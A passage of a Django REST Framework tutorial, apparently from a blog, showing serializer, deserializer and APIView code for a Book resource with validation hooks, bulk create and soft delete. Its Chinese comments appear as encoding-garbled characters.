class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># ÂçïÊü•</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># ÂçïÊù°Êï∞ÊçÆÂ∫èÂàóÂåñ</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'Êï∞ÊçÆ‰∏çÂ≠òÂú®'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># Áæ§Êü•</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(</span><br><span class="line">                is_delete=<span class="literal">False</span>).all()  <span class="comment"># ÂÖàÁ≠õÈÄâÊü•ËØ¢,ÂÜçÊü•ÊâÄÊúâ</span></span><br><span class="line">            book_data = serializers.BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># ‰∏çÁÆ°ÊòØ‰∏ÄÊù°ËøòÊòØÂ§öÊù°ÔºåÂè™Ë¶ÅÊï∞ÊçÆÊòØË¢´[]ÂµåÂ•óÔºåÈÉΩË¶ÅÂÜômany=True</span></span><br><span class="line">        <span class="comment"># ËøîÂõûÂâçÁ´ØÊï∞ÊçÆ</span></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></details><h4 id="Â≠êË∑ØÁî±Â±Ç-apiurls.py">Â≠êË∑ØÁî±Â±Ç <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="ÂèçÂ∫èÂàóÂåñ">ÂèçÂ∫èÂàóÂåñ</h3><h4 id="Â∫èÂàóÂåñÂ±Ç-apiserializers.py-1">Â∫èÂàóÂåñÂ±Ç <code>api/serializers.py</code></h4><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelDeserializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># ‰∏Ä‰∫õÂè™ÂèÇ‰∏éÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÊÆµÔºå‰ΩÜÊòØ‰∏çÊòØ‰∏éÊï∞ÊçÆÂ∫ìÂÖ≥ËÅîÁöÑÔºåËá™ÂÆö‰πâ‰∏çÂÖ•Â∫ìÁöÑÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÊÆµ</span></span><br><span class="line">    <span class="comment"># Ëá™ÂÆö‰πâÂ≠óÊÆµÁöÑ read_onlyÂ±ûÊÄßÂøÖÈ°ªÂÆö‰πâÂú®CharFieldÔºå‰∏çËÉΩÂÜôÂú®‰∏ãÊñπÁöÑextra_kwargs‰∏≠ÔºåÂê¶Âàô‰ºöË¢´‰º†ÂÖ•models.BookËøõË°åÂèçÂ∫èÂàóÂåñËÄåÊä•Èîô</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        exclude = [<span class="string">'is_delete'</span>, <span class="string">'create_time'</span>, <span class="string">'img'</span>]</span><br><span class="line">        <span class="comment"># fields = ('name', 'price', 'publish', 'authors','re_name')  #Ê≤°ÊúâÈªòËÆ§ÂÄºÁöÑÂ≠óÊÆµÂøÖÈ°ªÂ∫èÂàóÂåñÔºå‰∏∫ÂÖ∂‰º†ÂÄº</span></span><br><span class="line">        <span class="comment"># extra_kwargs Áî®Êù•ÂÆåÊàêÂèçÂ∫èÂàóÂåñÂ≠óÊÆµÁöÑ Á≥ªÁªüÊ†°È™åËßÑÂàô</span></span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,  <span class="comment"># ËÆæÁΩÆnameÂ≠óÊÆµÂøÖÂ°´</span></span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'ÂøÖÂ°´È°π'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'Â§™Áü≠'</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®Èí©Â≠êÊ†°È™åÂçï‰∏™Â≠óÊÆµ  validate_Â≠óÊÆµÂêç</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span>  <span class="comment"># valueÊòØÂ≠óÊÆµnameÁöÑÂÄº</span></span><br><span class="line">        <span class="comment"># ‰π¶Âêç‰∏çËÉΩÂåÖÂê´ g Â≠óÁ¨¶</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'ËØ•g‰π¶‰∏çËÉΩÂá∫Áâà'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="comment"># ÂÖ®Â±ÄÈí©Â≠ê</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)  <span class="comment"># publishÂ¶ÇÊûúÊòØÂ§ñÈîÆÂ≠óÊÆµÔºåËøô‰∏™Â∞±ÊòØpublishÂØπË±°</span></span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(name=name, publish=publish):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(&#123;<span class="string">'book'</span>: <span class="string">'ËØ•‰π¶Â∑≤Â≠òÂú®'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ê≥®ÊÑèÔºöModelSerializerÁ±ªÂ∑≤ÁªèÂ∏ÆÊàë‰ª¨ÂÆûÁé∞‰∫Ü create ‰∏é update ÊñπÊ≥ï,‰∏çÈúÄË¶ÅÂÜôcreateÂ∞±ËÉΩÂàõÂª∫</span></span><br></pre></td></tr></table></figure></details><h4 id="ËßÜÂõæÂ±Ç-views.py-1">ËßÜÂõæÂ±Ç <code>views.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        book_ser = serializers.BookModelDeserializer(data=request_data)</span><br><span class="line">        <span class="comment"># raise_exception=TrueÔºöÂΩìÊ†°È™åÂ§±Ë¥•ÔºåÈ©¨‰∏äÁªàÊ≠¢ÂΩìÂâçËßÜÂõæÊñπÊ≥ïÔºåÊäõÂºÇÂ∏∏ËøîÂõûÁªôÂâçÂè∞</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_obj = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_obj).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><h4 id="Â≠êË∑ØÁî±Â±Ç-apiurls.py-1">Â≠êË∑ØÁî±Â±Ç <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><div class="note warning"><h4 id="Ê≥®ÊÑèÁÇπ">Ê≥®ÊÑèÁÇπ</h4><ol type="1"><li>ÂèçÂ∫èÂàóÂåñÂ±ÇÔºö<ul><li>Âú®ËÆæÁΩÆ<code>fields</code>ÔºåÊ≤°ÊúâÈªòËÆ§ÂÄºÁöÑÂ≠óÊÆµÈÉΩÂøÖÈ°ªËÆæÁΩÆÂèçÂ∫èÂàóÂåñ‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ì‰∏≠</li><li>‰ΩøÁî®<code>extra_kwargs</code> Êù•ËÆæÁΩÆÁ≥ªÁªüÊ†°È™åËßÑÂàô</li><li>ËÆæÁΩÆÂ±ÄÈÉ®Èí©Â≠êÂíåÂÖ®Â±ÄÈí©Â≠ê</li><li><code>ModelSerializer</code>Á±ªÂ∑≤ÁªèÂ∏ÆÊàë‰ª¨ÂÆûÁé∞‰∫Ü <code>create</code> ‰∏é <code>update</code> ÊñπÊ≥ïÔºå‰∏çÈúÄË¶ÅÂÜçÂÜô</li></ul></li><li>ËßÜÂõæÂ±ÇÔºö<ul><li>POSTËØ∑Ê±ÇÈÄöËøá<code>request.data</code>ÊãøÂà∞Êï∞ÊçÆÂåÖ</li><li>‰º†ÁªôÂèçÂ∫èÂàóÂåñ ,ÈÄöËøá<code>data=request_data</code>‰º†ÂÖ•ÈúÄË¶ÅÂèçÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆ</li><li><code>is_valid</code>Âà§Êñ≠Ê†°È™åÊòØÂê¶ÂêàÊ†º Ôºå<code>raise_exception=True</code>ÂøÖÈ°ªË¶ÅÂÜôÁöÑ</li><li>ÈÄöËøá<code>.save()</code>‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ì‰∏≠</li></ul></li></ol></div><h3 id="Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÊï¥Âêà">Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÊï¥Âêà</h3><h4 id="Â∫èÂàóÂåñÂ±Ç-apiserializers.py-2">Â∫èÂàóÂåñÂ±Ç <code>api/serializers.py</code></h4><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># ‰∏Ä‰∫õÂè™ÂèÇ‰∏éÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÊÆµÔºå‰ΩÜÊòØ‰∏çÊòØ‰∏éÊï∞ÊçÆÂ∫ìÂÖ≥ËÅîÁöÑÔºåËá™ÂÆö‰πâ‰∏çÂÖ•Â∫ìÁöÑÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÊÆµ</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>,</span><br><span class="line">                  <span class="string">'publish_name'</span>, <span class="string">'publish'</span>, <span class="string">'authors'</span>, <span class="string">'re_name'</span>)</span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'ÂøÖÂ°´È°π'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'Â§™Áü≠'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'authors'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'img'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'author_list'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish_name'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="comment"># ‰π¶Âêç‰∏çËÉΩÂåÖÂê´ g Â≠óÁ¨¶</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'ËØ•g‰π¶‰∏çËÉΩÂá∫Áâà'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)</span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="comment"># ËßÜÈ¢ëÈáå‰ΩøÁî®ËøôÁßçÈ™åËØÅÊñπÂºèÔºåÂÆûÈôÖÊòØ‰∏çÂêàÁêÜÁöÑÔºåÂõ†‰∏∫‰ºöÂØºËá¥ÈíàÂØπ‰ª∑Ê†º‰øÆÊîπÁöÑPUTËØ∑Ê±ÇÂ§±Ë¥•(name&amp;publishÂ∑≤Â≠òÂú®)</span></span><br><span class="line">        <span class="comment"># Âõ†Ê≠§Âú®ËøôÈáåÂ∞ÜÂÖ∂Ê≥®ÈáäÊéâ ÔºåÊ≠£Á°ÆÁöÑÊñπÂºèÊòØÂú®models.Book‰∏≠ÂØπËøô‰∏§‰∏™Â≠óÊÆµÁöÑÂÖ±ÂêåÂîØ‰∏ÄÊÄß‰ΩúÁ∫¶Êùü</span></span><br><span class="line">        <span class="comment"># ËÄåÊú¨ÂáΩÊï∞ÈÄöÂ∏∏‰Ωú‰∏∫ÂØπ‰∏çÂêåattrÁöÑÂØπÊØîÈ™åËØÅÔºåÂ¶Ç‰∏§Ê¨°ËæìÂÖ•ÂØÜÁ†ÅÊòØÂê¶‰∏ÄËá¥Á≠â</span></span><br><span class="line">        <span class="comment"># if models.Book.objects.filter(name=name, publish=publish):</span></span><br><span class="line">        <span class="comment">#     raise ValidationError(&#123;'book': 'ËØ•‰π¶Â∑≤Â≠òÂú®'&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> attrs</span><br></pre></td></tr></table></figure></details><div class="note warning"><h5 id="Ê≥®ÊÑèÁÇπ">Ê≥®ÊÑèÁÇπ</h5><ol type="1"><li><code>fields</code>‰∏≠ËÆæÁΩÆÊâÄÊúâÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÂ≠óÊÆµ</li><li><code>extra_kwargs</code>ÂàíÂàÜÂè™Â∫èÂàóÂåñÊàñÂè™ÂèçÂ∫èÂàóÂåñÂ≠óÊÆµÔºà‰∏ÄËà¨Êàë‰ª¨ÊääÈúÄË¶ÅÂ≠òÂÖ•Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑ‰ΩøÁî®<code>write_only</code>ÔºàÂèçÂ∫èÂàóÂåñÔºâ,Âè™ÈúÄË¶ÅÂ±ïÁ§∫ÁöÑÂ∞±read_only(Â∫èÂàóÂåñ)ÔºåÁúãÈúÄÊ±ÇËÆæËÆ°Ôºâ<ul><li><code>write_only</code>ÔºöÂè™ÂèçÂ∫èÂàóÂåñ</li><li><code>read_only</code>ÔºöÂè™Â∫èÂàóÂåñ</li><li>Ëá™ÂÆö‰πâÂ≠óÊÆµÈªòËÆ§Âè™Â∫èÂàóÂåñ(<code>read_only</code>)</li><li>Â¶ÇÊûúÂ≠óÊÆµÊ≤°ËÆæÁΩÆ<code>write_only</code>ÊàñËÄÖ<code>read_only</code>ÔºåÈÇ£‰πàËØ•Â≠óÊÆµÂèØ‰ª•Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ</li></ul></li><li>ËÆæÁΩÆÂèçÂ∫èÂàóÂåñÊâÄÈúÄÁöÑ Á≥ªÁªü„ÄÅÂ±ÄÈÉ®Èí©Â≠ê„ÄÅÂÖ®Â±ÄÈí©Â≠ê Á≠âÊ†°È™åËßÑÂàô</li></ol></div><h4 id="ËßÜÂõæÂ±Ç-views.py-2">ËßÜÂõæÂ±Ç <code>views.py</code></h4><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># ÂçïÊü•</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># Â∫èÂàóÂåñ</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'ÂèÇÊï∞ÊúâËØØ'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># Áæ§Êü•</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(is_delete=<span class="literal">False</span>).all()</span><br><span class="line">            book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># Â∫èÂàóÂåñ</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># ÂçïÂ¢û:‰º†ÁöÑÊï∞ÊçÆÊòØ‰∏émodelÂØπÂ∫îÁöÑ‰∏Ä‰∏™Â≠óÂÖ∏</span></span><br><span class="line">        <span class="comment"># Áæ§Â¢ûÔºöËÆæËÆ°‰º†ÈÄíÁöÑÊòØÂ§ö‰∏™modelÂØπÂ∫îÁöÑÂ≠óÂÖ∏ÂàóË°®,Âú®postman‰∏≠ÈÄöËøáÂàóË°®ÂµåÂ•óÂ≠óÂÖ∏‰º†ÂÄº</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="keyword">if</span> isinstance(request_data, dict):  <span class="comment"># Âà§Êñ≠Ëé∑ÂèñÁöÑÊï∞ÊçÆÊòØÂê¶ÊòØdict</span></span><br><span class="line">            many = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(request_data, list):  <span class="comment"># Âà§Êñ≠Ëé∑ÂèñÁöÑÊï∞ÊçÆÊòØÂê¶ÊòØlist</span></span><br><span class="line">            many = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'Êï∞ÊçÆÈîôËØØ'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        book_ser = serializers.V2BookModelSerializer(</span><br><span class="line">            data=request_data, many=many)  <span class="comment"># ÂèçÂ∫èÂàóÂåñ</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># book_resultÊòØÂØπË±°&lt;class 'app01.models.Book'&gt;ÔºåÁæ§Â¢ûÂ∞±ÊòØÂàóË°®Â•ó‰∏Ä‰∏™‰∏™ÂØπË±°</span></span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.V2BookModelSerializer(book_result, many=many).data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂçïÂà†: Êúâpk   #Âú®postman‰∏≠ÈÄöËøáË∑ØÂæÑ‰º†ÂèÇ</span></span><br><span class="line">    <span class="comment"># Áæ§Âà†ÔºöÊúâpks   &#123;"pks": [1, 2, 3]&#125;   #ÈÄöËøájson‰º†ÂèÇ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            pks = [pk]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pks = request.data.get(<span class="string">'pks'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(pk__in=pks, is_delete=<span class="literal">False</span>).update(is_delete=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'Âà†Èô§ÊàêÂäü'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'Âà†Èô§Â§±Ë¥•'</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></details><div class="note warning"><h5 id="Ê≥®ÊÑèÁÇπ">Ê≥®ÊÑèÁÇπ</h5><ol type="1"><li>Â∫èÂàóÂåñÊï∞ÊçÆÊúÄÂêéÂøÖÈ°ªË¶Å<code>.data</code> ÔºàÂõ†‰∏∫Ë¶Å‰º†ÁªôÂâçÁ´ØÔºâ</li><li>ÂèçÂ∫èÂàóÂåñÈÄöËøá<code>data</code>‰º†ÂèÇÔºåÂ∫èÂàóÂåñÈÄöËøá<code>instance</code>‰º†ÂèÇÔºàÂΩì‰Ω†Âè™‰º†‰∏Ä‰∏™ÂèÇÊï∞Êó∂ÔºåÈªòËÆ§ÊòØ<code>instance</code>ÁöÑÂèÇÊï∞Ôºâ</li><li>ÂèçÂ∫èÂàóÂåñ‰∏éÂ∫èÂàóÂåñÈÉΩËÉΩ‰ΩøÁî®<code>many=True</code>ÔºåÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÂè™Ë¶ÅË¢´[]ÂµåÂ•óÈÉΩË¶ÅÂÜô<code>many=True</code></li></ol></div><h4 id="Â≠êË∑ØÁî±Â±Ç-apiurls.py-2">Â≠êË∑ØÁî±Â±Ç <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.V2Book.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.V2Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 